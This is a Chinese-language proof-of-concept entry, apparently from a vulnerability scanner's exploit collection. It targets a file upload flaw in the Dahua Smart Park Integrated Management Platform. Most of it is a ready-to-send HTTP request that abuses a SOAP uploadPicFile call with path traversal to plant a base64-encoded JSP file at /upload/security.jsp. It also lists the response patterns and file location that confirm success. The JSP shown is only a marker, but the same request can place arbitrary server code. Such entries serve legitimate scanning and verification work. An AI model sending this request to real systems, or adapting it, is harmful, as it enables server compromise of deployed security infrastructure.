dict/exploit/WebPoc/安防系统/大华智慧园区综合管理平台文件上传漏洞3.poc.md

# 大华智慧园区综合管理平台文件上传漏洞3

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /emap/webservice/gis/soap/poi HTTP/1.1
Cookie: JSESSIONID=EF1B791C2906D7DB17B9D533FDD47795
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: application/x-www-form-urlencoded

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <res:uploadPicFile>
         <arg0>/../../security.jsp</arg0>
         <arg1>PCVAcGFnZSBpbXBvcnQ9ImphdmEudGV4dC4qLGphdmEudXRpbC4qLGphdmEuaW8uKiIlPgo8JQogICAgICBvdXQucHJpbnRsbigiVGhlcmUgYXJlIHZ1bG5lcmFiaWxpdGllcyBpbiB0aGUgd2Vic2l0ZS4iICk7CiU+</arg1>
      </res:uploadPicFile>
   </soapenv:Body>
</soapenv:Envelope>
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?code)(?=.*?1).*?$

> 上传文件定位：/upload/security.jsp

> 验证文件来源：大华智慧园区综合管理平台文件上传漏洞3.poc
